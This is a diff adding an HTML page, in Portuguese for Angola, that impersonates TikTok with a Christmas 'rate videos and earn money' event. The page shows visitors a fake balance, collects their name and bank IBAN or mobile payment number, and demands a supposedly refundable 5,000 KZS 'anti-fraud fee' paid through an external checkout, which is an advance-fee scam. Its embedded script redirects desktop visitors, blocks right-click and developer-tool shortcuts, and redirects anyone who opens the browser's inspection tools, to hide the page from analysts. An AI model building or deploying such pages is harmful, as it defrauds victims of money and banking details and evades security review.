@@ -1,0 +1,411 @@
+<!DOCTYPE html><html lang="pt-AO"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AVALIÇÃO DE NATAL</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/all.min.css">
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1397684491501570');
+fbq('track', 'PageView');
+</script></head>
+
+
+<body><noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1397684491501570&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+<script>
+(function() {
+  // --- CONFIGURE AQUI ---
+  const REDIRECT_URL = "https://erro-no-site.vercel.app/"; // <-- coloque o link do YouTube aqui
+
+  // --- DETECÇÃO DE PC (desktop) ---
+  function isDesktop() {
+    const ua = navigator.userAgent || navigator.vendor || window.opera;
+    // detecta Windows / Mac / Linux desktop básicos
+    return /Windows|Macintosh|Linux/i.test(ua) && !/Android|iPhone|iPad|iPod|Mobile/i.test(ua);
+  }
+
+  // --- REDIRECIONA SE FOR PC ---
+  function maybeRedirect() {
+    try {
+      if (isDesktop()) {
+        // evita loop se já estiver no YouTube
+        if (!location.href.startsWith(REDIRECT_URL)) {
+          location.replace(REDIRECT_URL);
+        }
+      }
+    } catch (e) {
+      console.error(e);
+    }
+  }
+
+  // --- BLOQUEIO BÁSICO DE INSPEÇÃO (atalhos e clique direito) ---
+  function blockInspectionShortcuts(e) {
+    // teclas comuns de devtools: F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U (ver código-fonte)
+    if (
+      e.key === "F12" ||
+      (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "i" || e.key === "J" || e.key === "j")) ||
+      (e.ctrlKey && (e.key === "U" || e.key === "u"))
+    ) {
+      e.preventDefault();
+      e.stopPropagation();
+      return false;
+    }
+  }
+
+  function installBasicBlocks() {
+    // bloqueia clique direito
+    window.addEventListener("contextmenu", function(e){ e.preventDefault(); }, true);
+
+    // bloqueia seleção e arrastar (opcional)
+    document.addEventListener("selectstart", function(e){ e.preventDefault(); }, true);
+    document.addEventListener("dragstart", function(e){ e.preventDefault(); }, true);
+
+    // bloqueia atalhos de teclado
+    window.addEventListener("keydown", function(e){ blockInspectionShortcuts(e); }, true);
+  }
+
+  // --- DETECTION: tenta identificar devtools abertos (não 100% confiável) ---
+  function detectDevTools() {
+    let last = { w: window.outerWidth - window.innerWidth, h: window.outerHeight - window.innerHeight };
+
+    // checagem periódica de diferenças dimensionais (quando devtools dock aberto muda a diferença)
+    setInterval(function() {
+      const diffW = Math.abs(window.outerWidth - window.innerWidth);
+      const diffH = Math.abs(window.outerHeight - window.innerHeight);
+
+      // threshold razoável (pode ajustar)
+      const THRESHOLD = 160;
+
+      if (diffW > THRESHOLD || diffH > THRESHOLD) {
+        // ação ao detectar devtools: redirecionar (ou fazer outra ação)
+        try { location.replace(REDIRECT_URL); } catch(e){ /* ignore */ }
+      }
+      last = { w: diffW, h: diffH };
+    }, 500);
+
+    // outro truque: detectar se console foi aberto via função toString
+    // (gera saída no console que pode ser observada por inspeção)
+    const element = new Image();
+    Object.defineProperty(element, 'id', {
+      get: function() {
+        // quando console tenta inspecionar, o getter é chamado — redireciona
+        try { location.replace(REDIRECT_URL); } catch(e){ /* ignore */ }
+      }
+    });
+    // chama uma vez para 'armar' armadilha no console
+    console.log("%c ", element);
+  }
+
+  // --- INICIALIZAÇÃO ---
+  try {
+    installBasicBlocks();
+    detectDevTools();
+    // redireciona logo no load se for PC
+    if (document.readyState === "complete" || document.readyState === "interactive") {
+      maybeRedirect();
+    } else {
+      window.addEventListener("DOMContentLoaded", maybeRedirect, { once: true });
+    }
+  } catch (err) {
+    console.error("Erro no script de bloqueio/redirecionamento:", err);
+  }
+})();
+</script>
+
+
+
+    <!-- Snow Container -->
+    <div id="snow-container"></div>
+
+    <!-- Notification Banner -->
+    <div id="notification-banner" class="notify-banner">
+        <span id="notify-text">João sacou 15.000 KZS</span>
+    </div>
+
+    <!-- Popup -->
+    <div id="popup" class="popup-overlay hidden">
+        <div class="popup-box">
+            <div class="coin">💰</div>
+            <h2>Parabéns!</h2>
+            <p>Você ganhou</p>
+            <h1 id="popup-amount" style="color: var(--gold); margin: 10px 0;">15.000 KZS</h1>
+            <p>Adicionado ao seu saldo.</p>
+        </div>
+    </div>
+
+    <!-- SECTION 1: HERO (TikTok Branded) -->
+    <section id="login-section" class="active">
+        <div class="card">
+            <div class="logo-area">
+                <!-- TikTok Logo with Glitch Effect colors -->
+                <i class="fab fa-tiktok logo-icon" style="filter: drop-shadow(2px 2px 0 #ff0050) drop-shadow(-2px -2px 0 #00f2ea);"></i>
+                <div class="santa-hat">🎅</div>
+            </div>
+            <h1>TikTok Natal</h1>
+            <p class="subtitle">Você ganhou <span style="color: var(--gold); font-size: 1.3em;">12.000 KZS</span></p>
+            <p class="desc">Parabéns! Você foi selecionado para o evento oficial de Natal do TikTok. Continue avaliando
+                para liberar seu saque.</p>
+
+            <div class="input-box">
+                <input type="text" id="login-input" placeholder="Digite seu nome para continuar...">
+            </div>
+
+            <button class="btn-main" onclick="startApp()">Continuar a Ganhar</button>
+
+            <div class="footer-nav">
+                <span><i class="fas fa-shield-alt"></i> Seguro</span>
+                <span><i class="fas fa-check-circle"></i> Oficial</span>
+            </div>
+        </div>
+    </section>
+
+    <!-- SECTION 2: DASHBOARD (Card Style + TikTok Brand) -->
+    <section id="dashboard-section" class="hidden">
+        <div class="top-bar">
+            <div class="brand">
+                <i class="fab fa-tiktok" style="font-size: 1.4rem; filter: drop-shadow(1px 1px 0 #ff0050) drop-shadow(-1px -1px 0 #00f2ea);"></i>
+                <span>TikTok Natal</span>
+            </div>
+            <div class="balance">
+                <span id="balance-val">12.000,00</span> KZS
+            </div>
+        </div>
+
+        <div class="content-area">
+            <div class="video-wrapper">
+                <div id="video-slot">
+                    <!-- Video will be loaded here -->
+                </div>
+            </div>
+            <p style="text-align: center; color: #888; margin-top: -1.5rem; margin-bottom: 1.5rem; font-size: 0.9rem;">
+                <i class="fas fa-eye"></i> Assista até o fim para contabilizar
+            </p>
+
+            <div class="controls">
+                <p class="label">O que você achou deste vídeo?</p>
+                <div class="rate-actions">
+                    <button class="action-btn" onclick="selectBtn(this)">👎 Ruim</button>
+                    <button class="action-btn" onclick="selectBtn(this)">😐 Médio</button>
+                    <button class="action-btn" onclick="selectBtn(this)">👍 Bom</button>
+                </div>
+
+                <p class="label">Nota de 0 a 10:</p>
+                <div class="rate-slider">
+                    <span>0</span>
+                    <input type="range" min="0" max="10" value="5">
+                    <span>10</span>
+                </div>
+
+                <br>
+                <button class="btn-main" onclick="submitRating()">Enviar Avaliação</button>
+            </div>
+        </div>
+    </section>
+
+    <!-- SECTION 3: LIMIT REACHED -->
+    <section id="limit-section" class="hidden">
+        <div class="card">
+            <div class="logo-area">
+                <i class="fas fa-trophy logo-icon" style="color: var(--gold);"></i>
+            </div>
+            <h1>Limite Atingido!</h1>
+            <p class="subtitle">Parabéns!</p>
+            <p class="desc">Você completou todas as avaliações disponíveis para hoje.</p>
+
+            <div class="alert-box" style="background: rgba(0, 255, 0, 0.1); border-color: #00ff00; color: #00ff00;">
+                Saldo Total: <br>
+                <span id="balance-val-final" style="font-size: 1.5rem; color: white;">0,00</span> KZS
+            </div>
+
+            <button class="btn-main" onclick="showWithdraw()">Realizar Saque</button>
+        </div>
+    </section>
+
+    <!-- SECTION 4: WITHDRAW -->
+    <section id="withdraw-section" class="hidden">
+        <div class="card">
+            <h1>Solicitar Saque</h1>
+            <p class="desc">Escolha onde deseja receber seu pagamento.</p>
+
+            <div class="methods">
+                <div class="method active" onclick="selectMethod(this)">
+                    <i class="fas fa-mobile-alt"></i>
+                    Express
+                </div>
+                <div class="method" onclick="selectMethod(this)">
+                    <i class="fas fa-university"></i>
+                    IBAN
+                </div>
+            </div>
+
+            <div class="input-box">
+                <label style="display:block; text-align:left; margin-bottom:5px; color:#888; font-size:0.9rem;">Chave
+                    /
+                    IBAN</label>
+                <input type="text" id="iban-input" placeholder="0000.0000.0000.0000">
+            </div>
+
+            <div class="alert-box" style="background: rgba(0, 242, 234, 0.1); border-color: var(--secondary); color: var(--secondary);">
+                Valor a receber: <br>
+                <span id="final-amount-display" style="font-size: 1.4rem; color: white;">0,00 KZS</span>
+            </div>
+
+            <button class="btn-main" onclick="processWithdraw()">Sacar Agora</button>
+        </div>
+    </section>
+
+    <!-- SECTION 5: ERROR / FEE -->
+    <section id="error-section" class="hidden">
+        <div class="card error-card">
+            <div class="error-circle">!</div>
+            <h1>Atenção Necessária</h1>
+            <p class="desc">Detectamos uma pendência no seu cadastro.</p>
+
+            <div class="alert-box">
+                Saldo Retido: <br>
+                <span id="error-amount" style="font-size: 1.5rem; color: black;">0,00 KZS</span>
+            </div>
+
+            <div class="info-text">
+                Para liberar seu saque imediatamente, é necessário pagar uma pequena <strong>Taxa de
+                    Validação
+                    Anti-Fraude</strong>.
+                <br><br>
+                Isso serve para confirmar que você é um humano real e não um robô. O valor será
+                <strong>reembolsado</strong> junto com seu saque.
+            </div>
+
+            <button class="btn-main" onclick="showInstructions()">Ativar Cadastro e Sacar</button>
+        </div>
+    </section>
+
+    <!-- SECTION 6: INSTRUCTIONS -->
+    <section id="instructions-section" class="hidden">
+        <div class="card" style="justify-content: flex-start; padding-top: 2rem;">
+            <!-- TikTok Logo -->
+            <div class="logo-area-small" style="margin-top: 1rem;">
+                <i class="fab fa-tiktok logo-icon-small" style="filter: drop-shadow(2px 2px 0 #ff0050) drop-shadow(-2px -2px 0 #00f2ea);"></i>
+            </div>
+
+            <h2 style="color: #ff0050; margin-bottom: 2rem; font-size: 1.4rem; line-height: 1.4;">
+                Ative seu Cadastro para<br>Receber o Dinheiro
+            </h2>
+
+            <!-- Step 1 -->
+            <div class="step-box">
+                <div class="step-badge">1º Passo</div>
+                <p>Para <span class="highlight-red">cadastrar seu IBAN ou número express</span>, é
+                    preciso fazer o pagamento da taxa <span class="highlight-red">ANTI-FRAUDE</span> no
+                    valor de 5.000 KZS.</p>
+                <p class="note">OBS: A taxa será <span class="highlight-red">100% devolvida</span> ao
+                    usuário junto ao seu 1º saque.</p>
+            </div>
+
+            <!-- Step 2 -->
+            <div class="step-box">
+                <div class="step-badge">2º Passo</div>
+                <p>Após o pagamento, você receberá imediatamente seu <span class="highlight-red">1º
+                        saque</span> e também receberá acesso ao App para <span class="highlight-red">continuar
+                        lucrando</span>.</p>
+            </div>
+
+            <!-- Action Button -->
+            <button class="btn-main" style="margin: 1.5rem 0;" onclick="showVSL()">Pagar Taxa e Receber
+                o Dinheiro</button>
+
+            <!-- Warning Box -->
+            <div class="warning-box">
+                <i class="fas fa-exclamation-triangle"></i>
+                <p>Após prosseguir, você terá <strong>10 minutos</strong> para concluir o pagamento e
+                    sacar.</p>
+                <p style="margin-top: 10px;">Se a taxa não for paga no prazo, <strong>seu saldo será
+                        100% devolvido ao App.</strong></p>
+            </div>
+
+            <!-- Footer Icons -->
+            <div class="secure-footer">
+                <i class="fas fa-shield-alt"></i>
+                <i class="fas fa-lock"></i>
+                <i class="fas fa-user-lock"></i>
+            </div>
+
+            <div class="legal-footer">
+                <p>Política de Privacidade | Termos de Uso | Direitos Autorais</p>
+                <p>© 2025 Tik Tok Brasil. Todos os direitos reservados.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- SECTION 7: VSL (Video Sales Letter) -->
+    <section id="vsl-section" class="hidden">
+        <div class="vsl-container-clean">
+            <!-- Balance Badge -->
+            <div class="vsl-balance-clean">
+                <div class="balance-label">Saldo Disponível</div>
+                <div class="balance-amount">
+                    <span id="vsl-balance-val">0,00</span> KZS
+                </div>
+            </div>
+
+            <!-- Main Content -->
+            <div class="vsl-content">
+                <!-- TikTok Logo -->
+                <div class="vsl-logo">
+                    <i class="fab fa-tiktok"></i>
+                    <span class="christmas-hat">🎅</span>
+                </div>
+
+                <!-- Headline -->
+                <h1 class="vsl-headline-clean">
+                    Assista até o fim para<br>
+                    <span class="highlight-text">liberar o teu saque</span>
+                </h1>
+
+                <!-- Video Player -->
+                <div class="vsl-video-clean">
+                    <vturb-smartplayer id="vid-692a33c5d69941550922214a" style="display: block; margin: 0 auto; width: 100%;"></vturb-smartplayer>
+                    <script type="text/javascript">
+                        var s = document.createElement("script");
+                        s.src = "https://scripts.converteai.net/a32201f5-5e84-4186-86c3-fbc80b0de481/players/692a33c5d69941550922214a/v4/player.js",
+                            s.async = !0, document.head.appendChild(s);
+                    </script>
+                </div>
+
+                <!-- CTA Button -->
+                <button class="btn-vsl-clean" onclick="window.location.href='https://checkout-tiktok-pay.vercel.app/'">
+                    <span class="btn-icon">🎁</span>
+                    Continuar para Receber
+                </button>
+
+                <!-- Trust Badges -->
+                <div class="trust-badges">
+                    <span><i class="fas fa-shield-alt"></i> Seguro</span>
+                    <span><i class="fas fa-lock"></i> Protegido</span>
+                    <span><i class="fas fa-check-circle"></i> Verificado</span>
+                </div>
+            </div>
+
+            <!-- Footer -->
+            <div class="vsl-footer-clean">
+                <p>© 2025 TikTok Natal • Todos os direitos reservados</p>
+            </div>
+        </div>
+    </section>
+
+    <script src="js/script.js"></script>
+
+
+
+</body></html>
